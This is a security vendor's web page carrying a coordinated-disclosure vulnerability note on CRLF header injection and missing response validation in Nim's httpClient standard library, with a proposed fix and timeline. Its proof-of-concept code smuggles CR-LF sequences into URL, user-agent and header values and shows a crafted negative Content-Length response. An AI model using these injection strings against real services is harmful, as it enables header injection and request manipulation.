<!doctype html>
<html lang="en-us">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Nim - stdlib Httpclient - Header Crlf Injection &amp; Server Response Validation | ConsenSys Diligence</title>
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta name="description" content="Vulnerability Note Summary The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang httpClient standard library:
 a CR-LF injection in various arguments lack of response value validation when parsing server responses  Details Description The nim standard library httpClient is vulnerable to a CR-LF injection in the target url. This issue shares similarities with CVE-2019-9740 and CVE-2019-9947 reported for the Python language with the difference that more injection vectors exist.">
<link href="/diligence/tachyons.min.css" rel="stylesheet">
<link href="/diligence/style.css" rel="stylesheet">
<link href="/diligence/highlight.css" rel="stylesheet">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.10.1/css/all.css" crossorigin="anonymous">
<link rel="canonical" href="https://consensys.net/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/">
<link rel="shortcut icon" type="image/png" href="/diligence/images/icon/favicon.png">
<link rel="nokia-touch-icon" href="/diligence/images/icon/favicon.png">
<link rel="apple-touch-icon-precomposed" href="/diligence/images/icon/favicon.png" sizes="1x1"><link rel="alternate" type="application/rss+xml" href="https://consensys.net/diligence/index.xml" title="ConsenSys Diligence" />
<meta itemprop="name" content="Nim - stdlib Httpclient - Header Crlf Injection &amp; Server Response Validation">
<meta itemprop="description" content="Vulnerability Note Summary The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang httpClient standard library:
 a CR-LF injection in various arguments lack of response value validation when parsing server responses  Details Description The nim standard library httpClient is vulnerable to a CR-LF injection in the target url. This issue shares similarities with CVE-2019-9740 and CVE-2019-9947 reported for the Python language with the difference that more injection vectors exist.">
<meta itemprop="datePublished" content="2020-07-30T18:41:52&#43;01:00" />
<meta itemprop="dateModified" content="2020-07-30T18:41:52&#43;01:00" />
<meta itemprop="wordCount" content="621">
<meta itemprop="keywords" content="" />
<meta property="og:title" content="Nim - stdlib Httpclient - Header Crlf Injection &amp; Server Response Validation | ConsenSys Diligence" />
<meta property="og:description" content="Vulnerability Note Summary The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang httpClient standard library:
 a CR-LF injection in various arguments lack of response value validation when parsing server responses  Details Description The nim standard library httpClient is vulnerable to a CR-LF injection in the target url. This issue shares similarities with CVE-2019-9740 and CVE-2019-9947 reported for the Python language with the difference that more injection vectors exist." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://consensys.net/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/" />
<meta property="article:published_time" content="2020-07-30T18:41:52+01:00" />
<meta property="article:modified_time" content="2020-07-30T18:41:52+01:00" /><meta property="og:site_name" content="ConsenSys Diligence" />
<meta name="twitter:title" content="Nim - stdlib Httpclient - Header Crlf Injection &amp; Server Response Validation | ConsenSys Diligence" />
<meta name="twitter:description" content="Vulnerability Note Summary The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang httpClient standard library:
 a CR-LF injection in various arguments lack of response value validation when parsing server responses  Details Description The nim standard library httpClient is vulnerable to a CR-LF injection in the target url. This issue shares similarities with CVE-2019-9740 and CVE-2019-9947 reported for the Python language with the difference that more injection vectors exist." /><meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@ConsenSysAudits" />
<meta name="twitter:creator" content="@ConsenSysAudits" />
<script type="text/javascript" id="hs-script-loader" async defer src="//js.hs-scripts.com/4795067.js"></script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
      'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
      })(window,document,'script','dataLayer','GTM-P5Z4ZWH');</script>
<script type="text/javascript" id="reload-pathfix">
        let lastSegment = window.location.pathname.substring(window.location.pathname.lastIndexOf('/') + 1); 
        if(lastSegment && lastSegment.length !==0 && lastSegment.indexOf(".") === -1){
          
          window.location.pathname += "/";  
        }
      </script>
<script async src='/cdn-cgi/bm/cv/669835187/api.js'></script></head>
<body>
<header class="header">
<nav class="db dt-l w-100 border-box pa4 ph5-l deli-nav">
<a class="db dtc-l v-mid mid-gray link dim w-100 w-25-l tc tl-l mb2 mb0-l dili-logo" href="/diligence" title="Home">
<img class="logo " src="/diligence/images/logo/logo.svg" alt="ConsenSys Diligence">
</a>
<div class="dili_menu_hambuger"></div>
<div class="db dtc-l v-mid w-100 w-75-l tc tr-l dili-header-menu">
<div class="dili-header-menu-inner">
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/audits/" title="Audits">Audits</a>
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/fuzzing/" title="Fuzzing">Fuzzing</a>
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/scribble/" title="Scribble">Scribble</a>
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/blog/" title="Blog">Blog</a>
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/tools/" title="Tools">Tools</a>
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/research/" title="Research">Research</a>
<a class="link dim light-gray f6 f5-l dib mr3 mr4-l" href="/diligence/about/" title="About">About</a>
<a class="link dim light-gray f6 f5-l dib" href="/diligence/contact/" title="Contact">Contact</a>
</div>
</div>
</nav>
<script type="text/javascript" style="display:none">
//<![CDATA[
window.__mirage2 = {petok:"9abf80104cf7b15cfc764d3f71c0b8df03e3feb8-1635633251-1800"};
//]]>
</script>
<script type="text/javascript" src="https://ajax.cloudflare.com/cdn-cgi/scripts/04b3eb47/cloudflare-static/mirage2.min.js"></script>
<img class="printlogo" alt="ConsenSys Diligence" data-cfsrc="/diligence/print-logo.png" style="display:none;visibility:hidden;"><noscript><img class="printlogo" alt="ConsenSys Diligence" src="/diligence/print-logo.png"></noscript>
</header>
<main role="main">
<div class="dili-navigator-page">
<div class="dili-blog-hero">
<div class="dili-hero-bg-mixin" style="background-image: url('/diligence/images/audit_report/feature-hero.png');"></div>
<div class="dili-container">
<div class="dili-blog-hero-inner">
<div class="item-eyebrow"></div>
<h1 class="item-title">Nim - stdlib Httpclient - Header Crlf Injection &amp; Server Response Validation</h1>
</div>
</div>
</div>
<article class="">
<div class="dili-navigator-wrapper">
<div class="dili-navigator-sidebar">
<ul class="dili-navigator-sidebar-inner">
<li>
<a href="#summary">1 Summary</a>
</li>
<li>
<a href="#details">2 Details</a>
<ul>
<li>
<a href="#description">2.1 Description</a>
</li>
<li>
<a href="#proof-of-concept">2.2 Proof of Concept</a>
</li>
<li>
<a href="#proposed-fix">2.3 Proposed Fix</a>
</li>
</ul>
</li>
<li>
<a href="#vendor-response">3 Vendor Response</a>
<ul>
<li>
<a href="#timeline">3.1 Timeline</a>
</li>
</ul>
</li>
<li>
<a href="#references">4 References</a>
</li>
</ul>
</div>
<div class="dili-navigator-content richtext">
<aside class="summary summary-cta-side">
<div class="cta-block">
<div class="item-outer">
<div class="item-inner">
<div class="item-title">
Book your 1-Day Security Spot Check
</div>
</div>
<div class="item-action">
<a class="btn btn-primary" href="https://pages.consensys.net/diligence-1-day-spot-check" target="_blank">Book Now</a>
</div>
</div>
</div>
<table>
<tr>
<th align="left">CVE</th>
<td align="left">
<a class="blue no-underline" href="https://nvd.nist.gov/vuln/detail/CVE-2020-15693">CVE-2020-15693</a>&nbsp;
<a class="blue no-underline" href="https://nvd.nist.gov/vuln/detail/CVE-2020-15694">CVE-2020-15694</a>&nbsp;
</td>
</tr>
<tr>
<th align="left">Vendor</th>
<td align="left"><a href="https://nim-lang.org/">nim-lang</a></td>
</tr>
<tr>
<th align="left">Affected Versions</th>
<td align="left"><= 1.2.6</td>
</tr>
<tr>
<th align="left">Vulnerability Class</th>
<td align="left">CWE-93</td>
</tr>
<tr>
<th align="left">Author(s)</th>
<td align="left">tintinweb</td>
</tr>
<tr>
<th align="left">Date</th>
<td align="left">Jul 30, 2020</td>
</tr>
</table>
</aside>
<h1 id="vulnerability-note">Vulnerability Note</h1>
<h2 id="summary">1 Summary</h2>
<p>The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang <code>httpClient</code> standard library:</p>
<ul>
<li>a <code>CR-LF</code> injection in various arguments</li>
<li>lack of response value validation when parsing server responses</li>
</ul>
<h2 id="details">2 Details</h2>
<h3 id="description">2.1 Description</h3>
<p>The nim standard library <code>httpClient</code> is vulnerable to a <code>CR-LF</code> injection in the target url. This issue shares similarities with <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9740">CVE-2019-9740</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9947">CVE-2019-9947</a> reported for the Python language with the difference that more injection vectors exist. An injection is possible if the attacker controls any part of the url provided to <code>httpClient.[get|post|...]</code>, the user-agent, or custom http header names or values.</p>
<p>Additionally, the library fails to properly validate the server response. For example, <code>httpClient.get().contentLength()</code> does not raise any error if a malicious server provides a negative <code>Content-Length</code>.</p>
<p>It should be noted that there seems to be a general lack of input validation (requests and response) and we expect more vectors to exist (e.g. see <code>generateHeaders</code>).</p>
<h3 id="proof-of-concept">2.2 Proof of Concept</h3>
<p>Note: <code>nim c -r -d:ssl client_inject.nim</code></p>
<p>1) header injection in any url part</p>
<p>a) query</p>
<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="kn">import</span> <span class="n">httpClient</span>
<span class="kd">var</span> <span class="n">client</span> <span class="o">=</span> <span class="n">newHttpClient</span><span class="p">()</span>
<span class="kd">var</span> <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#34;https://localhost:4433?a=1 HTTP/1.1</span><span class="se">\r\n</span><span class="s">X-injected: header</span><span class="se">\r\n</span><span class="s">TEST: 123&#34;</span><span class="p">)</span> 
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">contentLength</span><span class="p">()</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">body</span><span class="p">()</span></code></pre></div>
<p>Serialized request: see <code>X-injected</code></p>
<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/?a=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">X-injected</span><span class="o">:</span> <span class="l">header</span>
<span class="n">TEST</span><span class="o">:</span> <span class="l">123 HTTP/1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">localhost:4433</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
<span class="n">content-length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">user-agent</span><span class="o">:</span> <span class="l">Nim httpclient/1.2.4</span></code></pre></div>
<p>b) in the path</p>
<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="kn">import</span> <span class="n">httpClient</span>
<span class="kd">var</span> <span class="n">client</span> <span class="o">=</span> <span class="n">newHttpClient</span><span class="p">()</span>
<span class="kd">var</span> <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#34;https://localhost:4433/a/1 HTTP/1.1</span><span class="se">\r\n</span><span class="s">X-injected: header</span><span class="se">\r\n</span><span class="s">TEST: 123&#34;</span><span class="p">)</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">contentLength</span><span class="p">()</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">body</span><span class="p">()</span></code></pre></div>
<p>Serialized request: see <code>X-injected</code></p>
<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/a/1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">X-injected</span><span class="o">:</span> <span class="l">header</span>
<span class="n">TEST</span><span class="o">:</span> <span class="l">123 HTTP/1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">localhost:4433</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
<span class="n">content-length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">user-agent</span><span class="o">:</span> <span class="l">Nim httpclient/1.2.4</span></code></pre></div>
<p>2) header injection in user-agent, http headers</p>
<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="kn">import</span> <span class="n">httpClient</span>
<span class="kd">var</span> <span class="n">client</span> <span class="o">=</span> <span class="n">newHttpClient</span><span class="p">(</span><span class="s">&#34;MyUserAgent</span><span class="se">\r\n</span><span class="s">X-Injected: myheader&#34;</span><span class="p">)</span>
<span class="n">client</span><span class="p">.</span><span class="n">headers</span> <span class="o">=</span> <span class="n">newHttpHeaders</span><span class="p">({</span> <span class="s">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s">&#34;applicat</span><span class="se">\r\n</span><span class="s">ion/json&#34;</span> <span class="p">})</span>
<span class="kd">var</span> <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#34;https://localhost:4433?a=1 HTTP/1.1</span><span class="se">\r\n</span><span class="s">X-injected: header</span><span class="se">\r\n</span><span class="s">TEST: 123&#34;</span><span class="p">)</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">contentLength</span><span class="p">()</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">body</span><span class="p">()</span></code></pre></div>
<p>Serialized request: see <code>X-injected</code>, <code>TEST: 123</code></p>
<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/?a=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">X-injected</span><span class="o">:</span> <span class="l">header</span>
<span class="n">TEST</span><span class="o">:</span> <span class="l">123 HTTP/1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">localhost:4433</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
<span class="n">content-length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">content-type</span><span class="o">:</span> <span class="l">applicat</span>
<span class="err">ion/json</span>
user-agent: MyUserAgent
X-Injected: myheader</code></pre></div>
<p>3) Integers are parsed as signed ints instead of natural numbers</p>
<p>The <code>httpClient</code> silently accepts invalid return parameters. For example, the content-length header is initially stored as a string without being verified to be in a proper range. When accessing it, it is being parsed as a signed integer and therefore allows to return negative numbers.</p>
<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="k">proc </span><span class="nf">contentLength</span><span class="o">*</span><span class="p">(</span><span class="n">response</span><span class="p">:</span> <span class="n">Response</span> <span class="o">|</span> <span class="n">AsyncResponse</span><span class="p">):</span> <span class="kt">int</span> <span class="o">=</span>
  <span class="sd">## Retrieves the specified response&#39;s content length.</span>
  <span class="sd">##</span>
  <span class="sd">## This is effectively the value of the &#34;Content-Length&#34; header.</span>
  <span class="sd">##</span>
  <span class="sd">## A ``ValueError`` exception will be raised if the value is not an integer.</span>
  <span class="kd">var</span> <span class="n">contentLengthHeader</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">getOrDefault</span><span class="p">(</span><span class="s">&#34;Content-Length&#34;</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">contentLengthHeader</span><span class="p">.</span><span class="n">parseInt</span><span class="p">()</span></code></pre></div>
<p>Request:</p>
<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/?a=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">X-injected</span><span class="o">:</span> <span class="l">header</span>
<span class="n">TEST</span><span class="o">:</span> <span class="l">123 HTTP/1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">localhost:4433</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
<span class="n">content-length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">user-agent</span><span class="o">:</span> <span class="l">Nim httpclient/1.2.4</span></code></pre></div>
<p>Malicious server response: <code>Content-Length: -23</code></p>
<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Sun, 10 Oct 2010 23:26:07 GMT</span>
<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g</span>
<span class="n">Last-Modified</span><span class="o">:</span> <span class="l">Sun, 26 Sep 2010 22:04:35 GMT</span>
<span class="n">ETag</span><span class="o">:</span> <span class="l">&#34;45b6-834-49130cc1182c0&#34;</span>
<span class="n">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">-23</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>

Hello world!</code></pre></div>
<p>Accessing the <code>Content-Length</code> yields the negative number -23.</p>
<div class="highlight"><pre class="chroma"><code class="language-nim" data-lang="nim"><span class="kn">import</span> <span class="n">httpClient</span>
<span class="kd">var</span> <span class="n">client</span> <span class="o">=</span> <span class="n">newHttpClient</span><span class="p">()</span>
<span class="kd">var</span> <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#34;http://localhost:4433/a/1 HTTP/1.1</span><span class="se">\r\n</span><span class="s">X-i</span><span class="se">\x00\x01</span><span class="s">YOnjected: header</span><span class="se">\r\n</span><span class="s">TEST: 123&#34;</span><span class="p">)</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">contentLength</span><span class="p">()</span>
<span class="n">echo</span> <span class="n">response</span><span class="p">.</span><span class="n">body</span><span class="p">()</span></code></pre></div>
<p>output:</p>
<pre><code>⇒  nim c -r -d:ssl  client_inject.nim
...
Hint:  [Link]
Hint: 112071 LOC; 1.103 sec; 112.691MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject.nim; out: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject  [Exec]
-23</code></pre>
<p>This might pose a risk to applications that are not checking whether response values are within sane bounds.</p>
<h3 id="proposed-fix">2.3 Proposed Fix</h3>
<ul>
<li>properly validate all parameters used in the module. Do not allow any context sensitive characters of the underlying protocol (e.g. <code>CR-LF</code>, <code>:</code> in header keys, &hellip;)</li>
<li>validate the server response. Use <code>parseNatural</code> instead of <code>parseInt</code> to parse positive natural numbers.</li>
</ul>
<h2 id="vendor-response">3 Vendor Response</h2>
<p>Vendor response: fixed in <a href="https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html">v1.2.6</a> (<a href="https://github.com/nim-lang/security/security/advisories/GHSA-4xc7-fp2p-49j3">Official Security Advisory</a>)</p>
<h3 id="timeline">3.1 Timeline</h3>
<pre><code>JUL/09/2020 - contact nim developers @telegram; provided details, PoC
JUL/30/2020 - fixed in new release
MAR/26/2021 - vendor advisory (https://github.com/nim-lang/security/security/advisories/GHSA-4xc7-fp2p-49j3), public disclosure</code></pre>
<h2 id="references">4 References</h2>
<ul>
<li>[1] <a href="https://nim-lang.org/">https://nim-lang.org/</a></li>
<li>[2] <a href="https://nim-lang.org/install.html">https://nim-lang.org/install.html</a></li>
<li>[3] <a href="https://en.wikipedia.org/wiki/Nim_(programming_language">https://en.wikipedia.org/wiki/Nim_(programming_language</a>)</li>
<li>[4] <a href="https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html">https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html</a></li>
</ul>
</div>
</div>
</article>
</div>
</main>
<footer class="footer">
<div class="dili-contact-block">
<div class="dili-container">
<div class="item-outer">
<div class="item-logo">
<img class="logo" data-cfsrc="/diligence/images/home/icon-ili-xs.png" alt="" style="display:none;visibility:hidden;"><noscript><img class="logo" src="/diligence/images/home/icon-ili-xs.png" alt=""></noscript>
</div>
<div class="item-title">
Request a Security Review Today
</div>
<div class="item-description">
Get in touch with our team to request a quote for a smart contract audit.
</div>
<div class="item-action">
<a class="btn-primary" href="/diligence/contact/">Contact Us</a>
</div>
</div>
</div>
</div>
<form action="" class="dili-newsletter-form-block">
<div class="dili-newsletter-block">
<div class="dili-container">
<div class="dili-newsletter-wrapper">
<div class="dili-menu-side">
<div class="item-logo">
<img class="logo" src="/diligence/images/home/icon-ili-outline-white.svg" alt="">
</div>
<div class="item-menu-list">
<a class="link" href="/diligence/audits/" title="Audits">Audits</a>
<a class="link" href="/diligence/fuzzing/" title="Fuzzing">Fuzzing</a>
<a class="link" href="/diligence/scribble/" title="Scribble">Scribble</a>
<a class="link" href="/diligence/blog/" title="Blog">Blog</a>
<a class="link" href="/diligence/tools/" title="Tools">Tools</a>
<a class="link" href="/diligence/research/" title="Research">Research</a>
<a class="link" href="/diligence/about/" title="About">About</a>
<a class="link" href="/diligence/contact/" title="Contact">Contact</a>
<a class="link" target="_blank" href="https://consensys.net/open-roles/?discipline=32525" title="Careers">Careers</a>
<a class="link" href="/diligence/privacy-policy/" title="Privacy Policy">Privacy Policy</a>
</div>
</div>
<div class="dili-newsletter-form">
<div class="newsletter-title">
Subscribe to Our Newsletter
</div>
<div class="newsletter-description">
Stay up-to-date on our latest offerings, tools, and the world of blockchain security.
</div>
<div class="newsletter-hubspot-wrapper">
<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script>
<script>
                        hbspt.forms.create({
                            portalId: "4795067",
                            formId: "2112c777-481a-4672-8788-9fd6a239e3fe",
                            onFormSubmitted: function () {
                                
                                
                                
                                
                                dataLayer.push({
                                    'event': 'newsletter_signup_form_submitted',
                                });
                            },
                        });
                        </script>
</div>
</div>
</div>
</div>
</div>
</form>
<div class="dili-powered-by">
<a href="https://consensys.net/">
<img class="logo" src="/diligence/images/home/powered-by.svg" alt="">
</a>
</div>
</footer>
<script src="/diligence/js/jquery-3.5.1.min.js"></script>
<script src="/diligence/js/owl.carousel.min.js"></script>
<script src="/diligence/js/clipboard.min.js"></script>
<script src="/diligence/js/autoload.js"></script>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P5Z4ZWH"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>
      $('.expandable .expander').click(function (e) {
        $(this).children().toggle();
        $(this).next('.expandable-content').toggle();
        e.preventDefault();
      });
    </script>
<script>(function(){
      var s=document.createElement('script');
      e = !document.body ? document.querySelector('head'):document.body;
      s.src='https://acsbapp.com/apps/app/dist/js/app.js';
      s.defer=true;
      s.onload=function(){
        acsbJS.init({
          statementLink     : '',
          feedbackLink      : '',
          footerHtml        : '',
          hideMobile        : false,
          hideTrigger       : false,
          language          : 'en',
          position          : 'left',
          leadColor         : '#146ff8',
          triggerColor      : '#2c6fdd',
          triggerRadius     : '50%',
          triggerPositionX  : 'left',
          triggerPositionY  : 'bottom',
          triggerIcon       : 'settings2',
          triggerSize       : 'medium',
          triggerOffsetX    : 20,
          triggerOffsetY    : 20,
          mobile            : {
            triggerSize       : 'small',
            triggerPositionX  : 'left',
            triggerPositionY  : 'bottom',
            triggerOffsetX    : 10,
            triggerOffsetY    : 10,
            triggerRadius     : '50%'
          }
        });
      };
      e.appendChild(s);}());
    </script>
<script type="text/javascript">(function(){window['__CF$cv$params']={r:'6a681c0d6e2961e2',m:'W.wq7I7ZaHqVhiM.F.FJeD24_wwO3IUTXi2cyIi8LbU-1635633251-0-AZMd2lMbyQYYHdP1Y5z15rhrWhfzZtUD65mH3Ul1RLWUCoo8lv2a8BNVB05leTs3inK6M8O6GFmX7zSHvI1LKafwj5FBnqxd8oBjmRPt+9qsvFJq0lHuUknt1lsxe63jnupZzZBkt5FdGh4xDbxvNm1zJ0IE594SfoP7hG49BCqJ1+v+D8nDylOB7Xm+kA0S5WsYlRvKcDj6aRwLsTw3/M0=',s:[0x96db602d01,0xe22b683baa],}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a681c0d6e2961e2","token":"8d85f93baed44309addf389efbd09c5d","version":"2021.10.0","si":100}'></script>
</body>
</html>
